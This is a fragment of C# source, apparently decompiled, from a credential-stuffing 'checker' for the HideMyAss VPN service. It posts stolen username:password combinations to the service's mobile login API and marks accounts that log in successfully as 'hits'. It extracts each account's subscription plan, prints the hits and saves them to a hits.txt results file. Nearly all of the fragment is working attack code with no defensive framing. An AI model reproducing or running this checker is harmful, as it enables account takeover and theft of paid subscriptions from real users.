...
namespace HideMyAss
{
  internal class Check
  {
        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string source = httpRequest.Post("https://mobile.api.hmageo.com/clapi/v1.5/user/login", str1, "application/x-www-form-urlencoded").ToString();
              if (!source.Contains("Invalid username/password combination"))
              {
                if (source.Contains("{\"status\":0,\"data\":{\"user\":\""))
                {
                  string str2 = Check.Parse(source, "\"plan\":\"", "\"");
                  Check.Parse(source, "\"expires\":\"", "\"");
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - HMA] " + s[0] + ":" + s[1] + " | Plan: " + str2, Color.Green);
                  Export.AsResult("/Hma_hits", s[0] + ":" + s[1] + " | Plan: " + str2);
                  return false;
                }
              }
              else
    ...
    public static void Good(string account)
    {
      try
      {
        using (StreamWriter streamWriter = new StreamWriter("Results/Hide My Ass/" + Login.date + "//hits.txt", true))
